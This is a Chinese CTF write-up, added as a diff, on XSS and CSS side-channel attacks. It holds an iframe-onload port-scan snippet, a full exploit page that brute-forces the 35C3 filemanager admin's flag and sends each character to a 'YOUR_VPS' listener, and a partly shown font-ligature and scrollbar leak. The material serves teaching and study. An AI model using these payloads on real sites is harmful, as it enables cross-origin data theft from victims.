@@ -1,0 +1,911 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h1 data-content="1" id="5a398fd15017957ef772d8383ac1d7e0">前言</h1>
+<p>近期学习总结了一下侧信道相关的知识，做了几道典型的题。这几道题很多师傅也写过详细的wp，在参考师傅们思路的基础上复现了一下（膜师傅们），文章的内容主要是把这几道题的知识点拎出来总结了一下。第一次投稿，师傅们轻喷，如果有说的不对的地方，欢迎师傅们交流指正quq。</p>
+<h1 data-content="1" id="0fea26b45322e3fd51a400723285e563">侧信道攻击简介</h1>
+<p>侧信道攻击的概念来源于密码学，下面是维基百科对其的解释：</p>
+<blockquote>
+<p>在密码学中，<strong>旁道攻击</strong>又称<strong>侧信道攻击</strong>、<strong>边信道攻击</strong>（英语：Side-channel attack）是一种攻击方式，它基于从密码系统的物理中获取的信息而非暴力破解法或是算法中的理论性弱点（较之密码分析）。例如：时间信息、功率消耗、电磁]泄露或甚是声音可以提供额外的信息来源，这可被利用于对系统的进一步破解。某些侧信道攻击还要求攻击者有关于密码系统内部操作的技术性信息，不过，其他诸如<a href="https://zh.wikipedia.org/wiki/电力分析" target="_blank">差分电力分析</a>的方法在黑盒攻击中效果明显。许多卓有成效的侧信道攻击基于由保罗·科切开拓的统计学方法。</p>
+</blockquote>
+<p>简单来说，侧信道就是利用侧信息(Side Channel)来高效地绕过或突破某些防御，而避免一些低效的爆破等。对于XSS侧信道，大多是利用一些可能有利于XSS但又并非属于XSS代码本身范畴的特性来绕过一些Waf从而实现侧信道攻击，而XSS侧信道攻击的结果拓展了XSS的某些"鸡肋"，更加巧妙的泄露出数据进而获取。</p>
+<p>下面我们通过几道题目来学习关于XSS侧信道的相关知识点</p>
+<h1 data-content="1" id="24949611ca0875a9a181f042ceecc617">35C3 CTF filemanager</h1>
+<p>这道题重点考察了以下内容</p>
+<ol>
+<li>
+<p>iframe的onload</p>
+</li>
+<li>
+<p>XSS Auditor特性</p>
+</li>
+<li>
+<p>利用侧信道读取数据并外带数据</p>
+</li>
+</ol>
+<h2 data-content="1" id="153e7932fe8d6c25ac2e027155392b7e">题目说明</h2>
+<blockquote>
+<p>Check out my web-based filemanager running at <a href="https://filemanager.appspot.com/" target="_blank">https://filemanager.appspot.com</a>.<br/>
+The admin is using it to store a flag, can you get it? You can reach the admin's chrome-headless at: nc 35.246.157.192 1</p>
+</blockquote>
+<p>题目一开始给了两个接口，给出了地址的web应用和管理员入口：<code>nc 35.246.157.192 1</code></p>
+<p><strong>1.web应用</strong></p>
+<ol>
+<li>
+<p>创建文件：可以自定义文件名，文件内容，并对文件进行存储，header中设置了<code>xsrf = 1</code>来防止csrf文件读取：</p>
+</li>
+<li>
+<p>文件读取：GET请求，且响应头中定义</p>
+</li>
+</ol>
+<div class="highlight"><pre><span></span>content-type:text/plain
+x-content-type-options: nosniff
+</pre></div>
+<ol>
+<li>文本查询：如果文本不存在将会返回<code>&lt;h1&gt;no results&lt;/h1&gt;</code>，如果文本存在，将会返回</li>
+</ol>
+<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>test<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+  <span class="p">&lt;</span><span class="nt">pre</span><span class="p">&gt;</span>diggid<span class="p">&lt;/</span><span class="nt">pre</span><span class="p">&gt;</span>
+
+  <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+    <span class="p">(()=&gt;{</span>
+      <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">pre</span> <span class="k">of</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="s1">'pre'</span><span class="p">))</span> <span class="p">{</span>
+        <span class="kd">let</span> <span class="nx">text</span> <span class="o">=</span> <span class="nx">pre</span><span class="p">.</span><span class="nx">innerHTML</span><span class="p">;</span>
+        <span class="kd">let</span> <span class="nx">q</span> <span class="o">=</span> <span class="s1">'diggid'</span><span class="p">;</span>
+        <span class="kd">let</span> <span class="nx">idx</span> <span class="o">=</span> <span class="nx">text</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="nx">q</span><span class="p">);</span>
+        <span class="nx">pre</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="sb">`</span><span class="si">${</span><span class="nx">text</span><span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">idx</span><span class="p">)</span><span class="si">}</span><span class="sb">&lt;mark&gt;</span><span class="si">${</span><span class="nx">q</span><span class="si">}</span><span class="sb">&lt;/mark&gt;</span><span class="si">${</span><span class="nx">text</span><span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="nx">idx</span><span class="o">+</span><span class="nx">q</span><span class="p">.</span><span class="nx">length</span><span class="p">)</span><span class="si">}</span><span class="sb">`</span><span class="p">;</span>
+      <span class="p">}</span>
+    <span class="p">})();</span>
+  <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</pre></div>
+<p>上面这段代码的作用就是高亮已存在的文本内容<code>diggid</code></p>
+<p><strong>2.nc接口</strong></p>
+<p>nc连上去后，会要求用Node.js的proof-of-work包进行验证计算，相当于一层简单的验证码，用一行命令即可算出验证码并提交：</p>
+<pre><code>proof-of-work &lt;prefix&gt; &lt;difficulty&gt;</code></pre>
+<p>校验成功就可以输入一个URL，管理员bot会访问这个URL(显然是模拟用户访问恶意构造的页面)</p>
+<p><strong>3.目标</strong></p>
+<p>题目说明中告诉了我们flag被admin用户存储了起来，如果是以admin用户的身份访问这个web应用，我们利用文本查询的功能可以获取flag。</p>
+<h2 data-content="1" id="ae33605bde8dbdeee98293d6efbb999f">iframe的onload</h2>
+<p>利用iframe的onload和chrome-error://chromewebdata/可以用来进行<strong>端口扫描</strong>，Chrome浏览器中的iframe标签，在对一个URL发送请求时，添加onload事件，无论是否请求成功，都会触发onload事件，但要注意：只有URL改变时才会触发onload事件，添加锚点<code>#</code>而URL未改变不会触发onload事件。当浏览器在向一个没有被服务器监听的端口发送请求时，显示错误页面，此时URL变为chrome-error://chromewebdata/。端口扫描的代码如下：</p>
+<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+    <span class="kd">var</span> <span class="nx">iframe</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">'iframe'</span><span class="p">);</span>
+    <span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="s2">"http://192.168.170.129:6666/"</span><span class="p">;</span> 
+    <span class="nx">iframe</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
+        <span class="nx">iframe</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
+            <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">'端口不存在'</span><span class="p">);</span>
+        <span class="p">};</span>
+        <span class="nx">iframe</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="nx">iframe</span><span class="p">.</span><span class="nx">src</span> <span class="o">+</span> <span class="s2">"#"</span><span class="p">;</span>
+    <span class="p">};</span>
+    <span class="nx">iframe</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="nx">url</span><span class="p">;</span>
+    <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">iframe</span><span class="p">);</span>
+<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</pre></div>
+<p>先给iframe设置好onload事件和url(该url为要探测的地址+端口)，在外层onload事件内部，修改url为<code>url + #</code>，并在内部重新定义了onload事件。</p>
+<ul>
+<li>
+<p>如果端口存在，则当资源加载完毕后，触发外层onload事件，而此时<code>iframe.src</code>仍为原来的URL，内部的onload事件不会触发</p>
+</li>
+<li>
+<p>如果端口不存在，此时的<code>iframe.src</code>变为<code>chrome-error://chromewebdata/</code>，URL改变重新请求新的资源，触发内层onload事件，从而打印出<code>端口不存在</code></p>
+</li>
+</ul>
+<blockquote>
+<p><strong>关于onload事件，还要注意的是，如果有多层onload，当改变URL时，只触发与修改URL语句就近的那层onload</strong></p>
+</blockquote>
+<p>上述代码还可以替换为用计数器来记录外层onload事件的触发次数，从而判断URL是否改变</p>
+<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+    <span class="kd">var</span> <span class="nx">iframe</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">'iframe'</span><span class="p">);</span>
+    <span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="s2">"http://192.168.170.129:6666/"</span><span class="p">;</span> 
+    <span class="kd">var</span> <span class="nx">count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="nx">iframe</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
+        <span class="nx">count</span><span class="o">++</span><span class="p">;</span>
+        <span class="k">if</span><span class="p">(</span><span class="nx">count</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">){</span>
+            <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">"端口不存在"</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">if</span><span class="p">(</span><span class="nx">count</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">){</span> <span class="c1">//防止无限onload</span>
+            <span class="nx">iframe</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="nx">iframe</span><span class="p">.</span><span class="nx">src</span> <span class="o">+</span> <span class="s2">"#"</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">};</span>
+    <span class="nx">iframe</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="nx">url</span><span class="p">;</span>
+    <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">iframe</span><span class="p">);</span>
+<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</pre></div>
+<h2 data-content="1" id="a12ef54c8f53b0d0071e25cb91da5099">XSS Auditor 和 chrome-error</h2>
+<p>Chrome中存在一个特性XSS Auditor：当在请求中匹配到了源码中的脚本，则会阻止该请求，并跳转到chrome-error://chromewebdata/(或者扫描到没有监听服务的端口也会跳转到该页面)。前面所说的文本查询部分，成功或失败存在两种状态，假设我们提交了如下URL</p>
+<pre><code>https://filemanager.appspot.com/search?q=diggid&amp;%3Cscript%3E%20%20%20%20%28%28%29%3d%3E%7b%0a%20%20%20%20%20%20for%20%28let%20pre%20of%20document%2egetElementsByTagName%28%27pre%27%29%29%20%7b%0a%20%20%20%20%20%20%20%20let%20text%20%3d%20pre%2einnerHTML%3b</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210322191622-0867d042-8b00-1.png"/></p>
+<p>假设文本中存在<code>diggid</code>，因此就会返回查询成功时的代码，同时检测到URL中存在和代码相同的部分，则会阻止该请求并跳转到chrome-error://chromewebdata/(对应上面端口扫描不存在的情况)。假设文本中不存在<code>diggid</code>，则会返回<code>&lt;h1&gt;no results&lt;/h1&gt;</code>，页面不会跳转。这一部分就和上面的端口扫描的思想一样了。因此爆破flag的思路就比较清晰了，上述原理就是利用了侧信道的思想来获取数据。</p>
+<h2 data-content="1" id="b96cf26898b99a9d8d897a883240ce2d">数据外带</h2>
+<p>梳理以下爆flag的流程：1.构造侧信道获取flag的页面；2.发送给管理员bot访问</p>
+<p>管理员bot访问后爆出的flag我们没办法获取，这里有两种方式来使得数据外带：</p>
+<ol>
+<li>
+<p>在爆破出flag的情况(onload触发两次)内再加一层onload，修改<code>iframe.src = 'http://YOUR_VPS:PORT/?flag='+encodeURIComponent(flag + char)</code>，也就是说每次爆出字符后，会请求自己vps，<strong>vps上监听一下就可以得到数据回显了</strong></p>
+</li>
+<li>
+<p>如果是本地测试(flag放在本地)，管理员bot的身份相当于自己，访问之后数据可以回显到自己浏览器中。可以将方法1替换为<code>console.log(encodeURIComponent(flag + char))</code></p>
+</li>
+</ol>
+<h2 data-content="1" id="944a779d4c008cf5c4f517b0309f5259">利用代码</h2>
+<p>我们根据上面的思想构造利用代码如下：</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">"en"</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">"UTF-8"</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+    <span class="kd">var</span> <span class="nx">URL</span> <span class="o">=</span> <span class="s1">'https://filemanager.appspot.com/search?q=flag&amp;a=%3Cscript%3E%20%20%20%20%28%28%29%3d%3E%7b%0a%20%20%20%20%20%20for%20%28let%20pre%20of%20document%2egetElementsByTagName%28%27pre%27%29%29%20%7b%0a%20%20%20%20%20%20%20%20let%20text%20%3d%20pre%2einnerHTML%3b'</span><span class="p">;</span>
+    <span class="kd">var</span> <span class="nx">charset</span> <span class="o">=</span> <span class="s1">'_abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&amp;\'()*+,-./:;&lt;=&gt;?@[\\]^`{|}~ '</span><span class="p">;</span>
+    <span class="kd">var</span> <span class="nx">flag</span> <span class="o">=</span> <span class="s1">'35C3'</span><span class="p">;</span> <span class="cm">/*35C3_xss_auditor_for_the_win*/</span>
+    <span class="kd">function</span> <span class="nx">GetFlag</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span> <span class="nx">flag</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span><span class="p">(</span><span class="nx">i</span> <span class="o">&gt;=</span> <span class="mi">94</span><span class="p">)</span>
+            <span class="k">return</span><span class="p">;</span>
+        <span class="kd">var</span> <span class="nx">real_flag</span> <span class="o">=</span> <span class="nx">flag</span> <span class="o">+</span> <span class="nx">charset</span><span class="p">[</span><span class="nx">i</span><span class="p">];</span>
+        <span class="kd">var</span> <span class="nx">iframe</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">'iframe'</span><span class="p">);</span>
+        <span class="kd">var</span> <span class="nx">count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="nx">iframe</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
+            <span class="nx">count</span><span class="o">++</span><span class="p">;</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nx">count</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nx">flag</span> <span class="o">=</span> <span class="nx">real_flag</span><span class="p">;</span>
+                <span class="nx">i</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span> <span class="c1">//递归重置</span>
+                <span class="nx">iframe</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{};</span> <span class="c1">//发送请求外带数据</span>
+                <span class="nx">iframe</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="s1">'http://YOUR_VPS:PORT/?flag='</span> <span class="o">+</span> <span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">real_flag</span><span class="p">);</span> <span class="err">#</span> <span class="nx">外带数据</span>
+            <span class="p">}</span>
+            <span class="nx">iframe</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="nx">iframe</span><span class="p">.</span><span class="nx">src</span> <span class="o">+</span> <span class="s1">'#'</span><span class="p">;</span>
+        <span class="p">};</span>
+        <span class="nx">iframe</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="nx">URL</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="s1">'flag'</span><span class="p">,</span> <span class="nx">real_flag</span><span class="p">);</span>
+        <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">iframe</span><span class="p">);</span>
+        <span class="nx">timer</span> <span class="o">=</span> <span class="nx">setTimeout</span><span class="p">(()</span> <span class="p">=&gt;</span> <span class="p">{</span>  
+            <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">removeChild</span><span class="p">(</span><span class="nx">iframe</span><span class="p">);</span>
+            <span class="nx">GetFlag</span><span class="p">(</span><span class="nx">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">flag</span><span class="p">);</span>
+        <span class="p">},</span> <span class="mi">2000</span><span class="p">);</span> <span class="c1">//设置延时保证onload加载完成</span>
+    <span class="p">}</span>
+    <span class="nx">GetFlag</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">flag</span><span class="p">);</span>
+<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</pre></div>
+<p>将上述代码保存为exp.html，发送URL给管理员bot访问，最后在自己vps的log中可以得到flag</p>
+<p><strong>参考</strong></p>
+<p><a href="https://www.secpulse.com/archives/94995.html" target="_blank">https://www.secpulse.com/archives/94995.html</a></p>
+<p><a href="https://xz.aliyun.com/t/3778#toc-1" target="_blank">https://xz.aliyun.com/t/3778#toc-1</a></p>
+<p><a href="https://github.com/sroettger/35c3ctf_chals" target="_blank">https://github.com/sroettger/35c3ctf_chals</a></p>
+<h1 data-content="1" id="826c0a024a5e5f3d63ae3c9ab0b9e054">XCTF 2019 Final noxss</h1>
+<p>在做这道题之前，我们需要先了解一些前置知识，题目场景简化如下：</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">"en"</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">"UTF-8"</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">"viewport"</span> <span class="na">content</span><span class="o">=</span><span class="s">"width=device-width, initial-scale=1.0"</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">"X-UA-Compatible"</span> <span class="na">content</span><span class="o">=</span><span class="s">"ie=edge"</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Document<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="cp">&lt;?php</span>
+<span class="cp">$token1 = md5($_SERVER['HTTP_USER_AGENT']);</span>
+<span class="cp">$token2 = md5($token1);</span>
+<span class="cp">?&gt;</span>
+<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">hidden</span> <span class="na">value</span><span class="o">=</span><span class="s">&lt;?=$token1</span> <span class="err">?</span><span class="p">&gt;</span>&gt;
+<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+    <span class="kd">var</span> <span class="nx">TOKEN</span> <span class="o">=</span> <span class="s2">"&lt;?=$token2 ?&gt;"</span><span class="p">;</span>
+<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+
+<span class="p">&lt;</span><span class="nt">style</span><span class="p">&gt;</span>
+    <span class="o">&lt;?=</span><span class="nt">preg_replace</span><span class="o">(</span><span class="s1">'#&lt;/style#i'</span><span class="o">,</span> <span class="s1">'#'</span><span class="o">,</span> <span class="o">$</span><span class="nt">_GET</span><span class="o">[</span><span class="s1">'css'</span><span class="o">])</span> <span class="o">?&gt;</span>
+<span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</pre></div>
+<p>题目要求比较简单，设置了两个token，第一个需要从<code>&lt;input&gt;</code>标签获取，第二个需要从<code>&lt;script&gt;</code>中获取，可控的部分只有<code>$_GET['css']</code>传入的css参数，其夹在<code>&lt;style&gt;</code>标签中，也就是说这个css参数其实也就是css样式。因此我们需要利用css侧信道来搞事情。关于token1如何获取，由于篇幅原因，这里就不过多解释了。主要来看和该题相关的token2如何获取。</p>
+<h2 data-content="1" id="2c1ab58597b65cc8e463c27d9ed3d3c7">获取<code>&lt;script&gt;</code>中的token2</h2>
+<h3 data-content="1" id="6d15348da8dabb955968c2fbad9bfd87">demo</h3>
+<p>在获取token2之前，我们先了解一下什么是连字</p>
+<blockquote>
+<p>字体中的连字至少由两个具有图形形式的字符序列组成。多个字符序列组成的连字就代表一个字符，其在Unicode中有相应的字符编码。调整字距不会影响连字中字符序列的距离。最常见的有<code>fi</code>的连字<code>ﬁ</code>。更多详细的说明可参考：</p>
+<ul>
+<li><a href="http://www.mzh.ren/ligature-intro.html" target="_blank">http://www.mzh.ren/ligature-intro.html</a></li>
+<li><a href="https://webzhao.me/ligatures.html" target="_blank">https://webzhao.me/ligatures.html</a></li>
+</ul>
+</blockquote>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210322191622-0899f9fa-8b00-1.png"/></p>
+<p>我们可以利用fontforge(<a href="http://designwithfontforge.com/zh-CN/Installing_Fontforge.html" target="_blank">安装fontforge</a>)来自定义生成字体(包括连字)</p>
+<blockquote>
+<p>现代浏览器已经不支持 SVG 格式的字体了，我们可以利用 fontforge 将 SVG 格式转换成 WOFF 格式</p>
+</blockquote>
+<p>准备一个script.fontforge文件将.svg转换为.woff</p>
+<pre><code>#!/usr/bin/fontforge
+Open($1)
+Generate($1:r + ".woff")</code></pre>
+<p>再准备我们构造好的test.svg文件，该文件中定义了名为<code>diggid</code>的字体，该字体中有：a-z 26个0宽度字母，hack这个宽度为9000的连字</p>
+<pre><code>&lt;svg&gt;
+  &lt;defs&gt;
+    &lt;font id="diggid" horiz-adv-x="0"&gt;
+      &lt;font-face font-family="hack" units-per-em="1000" /&gt;
+      &lt;missing-glyph /&gt;
+      &lt;glyph unicode="a" horiz-adv-x="0" d="M1 0z"/&gt;
+      &lt;glyph unicode="b" horiz-adv-x="0" d="M1 0z"/&gt;
+      &lt;glyph unicode="c" horiz-adv-x="0" d="M1 0z"/&gt;
+      &lt;glyph unicode="d" horiz-adv-x="0" d="M1 0z"/&gt;
+      &lt;glyph unicode="e" horiz-adv-x="0" d="M1 0z"/&gt;
+      &lt;glyph unicode="f" horiz-adv-x="0" d="M1 0z"/&gt;
+      &lt;glyph unicode="g" horiz-adv-x="0" d="M1 0z"/&gt;
+      &lt;glyph unicode="h" horiz-adv-x="0" d="M1 0z"/&gt;
+      &lt;glyph unicode="i" horiz-adv-x="0" d="M1 0z"/&gt;
+      &lt;glyph unicode="j" horiz-adv-x="0" d="M1 0z"/&gt;
+      &lt;glyph unicode="k" horiz-adv-x="0" d="M1 0z"/&gt;
+      &lt;glyph unicode="l" horiz-adv-x="0" d="M1 0z"/&gt;
+      &lt;glyph unicode="m" horiz-adv-x="0" d="M1 0z"/&gt;
+      &lt;glyph unicode="n" horiz-adv-x="0" d="M1 0z"/&gt;
+      &lt;glyph unicode="o" horiz-adv-x="0" d="M1 0z"/&gt;
+      &lt;glyph unicode="p" horiz-adv-x="0" d="M1 0z"/&gt;
+      &lt;glyph unicode="q" horiz-adv-x="0" d="M1 0z"/&gt;
+      &lt;glyph unicode="r" horiz-adv-x="0" d="M1 0z"/&gt;
+      &lt;glyph unicode="s" horiz-adv-x="0" d="M1 0z"/&gt;
+      &lt;glyph unicode="t" horiz-adv-x="0" d="M1 0z"/&gt;
+      &lt;glyph unicode="u" horiz-adv-x="0" d="M1 0z"/&gt;
+      &lt;glyph unicode="v" horiz-adv-x="0" d="M1 0z"/&gt;
+      &lt;glyph unicode="w" horiz-adv-x="0" d="M1 0z"/&gt;
+      &lt;glyph unicode="x" horiz-adv-x="0" d="M1 0z"/&gt;
+      &lt;glyph unicode="y" horiz-adv-x="0" d="M1 0z"/&gt;
+      &lt;glyph unicode="z" horiz-adv-x="0" d="M1 0z"/&gt;
+      &lt;glyph unicode="hack" horiz-adv-x="9000" d="M1 0z"/&gt;
+    &lt;/font&gt;
+  &lt;/defs&gt;
+&lt;/svg&gt;</code></pre>
+<p>执行以下命令生成test.woff文件</p>
+<pre><code>fontforge ./script.fontforge test.svg</code></pre>
+<p>接下来我们需要利用连字来搞一些事情。由于我们上面的字体中设置了<code>hack</code>连字，其字体宽度为9000，如果通过固定大小的iframe框引入时因为其宽度过大所以会出现滚动条，则在css代码中触发滚动条事件发出URL请求</p>
+<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">style</span><span class="p">&gt;</span>
+        <span class="p">@</span><span class="k">font-face</span> <span class="p">{</span>
+            <span class="nt">font-family</span><span class="o">:</span> <span class="s2">"hack"</span><span class="o">;</span>
+            <span class="nt">src</span><span class="o">:</span> <span class="nt">url</span><span class="o">(</span><span class="s2">"./test.woff"</span><span class="o">);</span> <span class="o">//</span><span class="nt">引入字体</span>
+        <span class="p">}</span>
+        <span class="nt">span</span> <span class="p">{</span>
+            <span class="k">background</span><span class="p">:</span> <span class="kc">lightblue</span><span class="p">;</span>
+            <span class="k">font-family</span><span class="p">:</span> <span class="s2">"hack"</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="nt">body</span> <span class="p">{</span>
+            <span class="k">white-space</span><span class="p">:</span> <span class="kc">nowrap</span><span class="p">;</span> <span class="err">//宽度过长不换行，保证出现横向的滚动条</span>
+        <span class="p">}</span>
+        <span class="nt">body</span><span class="p">::</span><span class="nd">-webkit-scrollbar</span> <span class="p">{</span>
+            <span class="k">background</span><span class="p">:</span> <span class="kc">blue</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="nt">body</span><span class="p">::</span><span class="nd">-webkit-scrollbar</span><span class="p">:</span><span class="nd">horizontal</span> <span class="p">{</span> 
+            <span class="k">background</span><span class="p">:</span> <span class="nb">url</span><span class="p">(</span><span class="sx">http://127.0.0.1:8888</span><span class="p">);</span> <span class="err">//出现滚动条发起请求给本地的8888端口</span>
+        <span class="p">}</span>
+<span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
+</pre></div>
+<p>将上述页面保存在test.html中</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">"en"</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">"UTF-8"</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">"viewport"</span> <span class="na">content</span><span class="o">=</span><span class="s">"width=device-width, initial-scale=1.0"</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">"X-UA-Compatible"</span> <span class="na">content</span><span class="o">=</span><span class="s">"ie=edge"</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">style</span><span class="p">&gt;</span>
+        <span class="p">@</span><span class="k">font-face</span> <span class="p">{</span>
+            <span class="nt">font-family</span><span class="o">:</span> <span class="s2">"hack"</span><span class="o">;</span>
+            <span class="nt">src</span><span class="o">:</span> <span class="nt">url</span><span class="o">(</span><span class="s2">"./test.woff"</span><span class="o">);</span>
+        <span class="p">}</span>
+        <span class="nt">span</span> <span class="p">{</span>
+            <span class="k">background</span><span class="p">:</span> <span class="kc">lightblue</span><span class="p">;</span>
+            <span class="k">font-family</span><span class="p">:</span> <span class="s2">"hack"</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="nt">body</span> <span class="p">{</span>
+            <span class="k">white-space</span><span class="p">:</span> <span class="kc">nowrap</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="nt">body</span><span class="p">::</span><span class="nd">-webkit-scrollbar</span> <span class="p">{</span>
+            <span class="k">background</span><span class="p">:</span> <span class="kc">blue</span> <span class="p">;</span>
+        <span class="p">}</span>
+        <span class="nt">body</span><span class="p">::</span><span class="nd">-webkit-scrollbar</span><span class="p">:</span><span class="nd">horizontal</span> <span class="p">{</span>
